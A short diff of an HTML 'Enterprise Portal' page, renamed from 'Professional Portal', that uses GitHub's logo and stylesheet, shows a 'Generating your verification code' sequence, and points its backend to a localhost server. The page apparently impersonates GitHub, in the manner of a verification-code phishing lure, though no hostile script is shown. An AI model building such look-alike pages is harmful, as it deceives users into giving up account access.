@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Professional Portal</title>
+  <title>Enterprise Portal</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <link rel="stylesheet" href="https://github.githubassets.com/assets/global.css">
   <style>
@@ -66,7 +66,7 @@
     <div class="logo">
       <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" width="50" alt="GitHub">
     </div>
-    <h2 id="title">Professional Portal</h2>
+    <h2 id="title">Enterprise Portal</h2>
     <div id="loading-state">
       <p>Generating your verification code...</p>
       <div class="step" id="step1"><i class="far fa-circle"></i> Establishing secure connection</div>
@@ -85,7 +85,7 @@
   </div>
   <script>
     // Configuration - Update this URL to your backend server
-    const BACKEND_URL = 'https://your-backend-domain.com'; // Replace with your actual backend URL
+    const BACKEND_URL = 'http://localhost:5033';
     
     async function simulateSteps() {
       const steps = ["step1", "step2", "step3"];
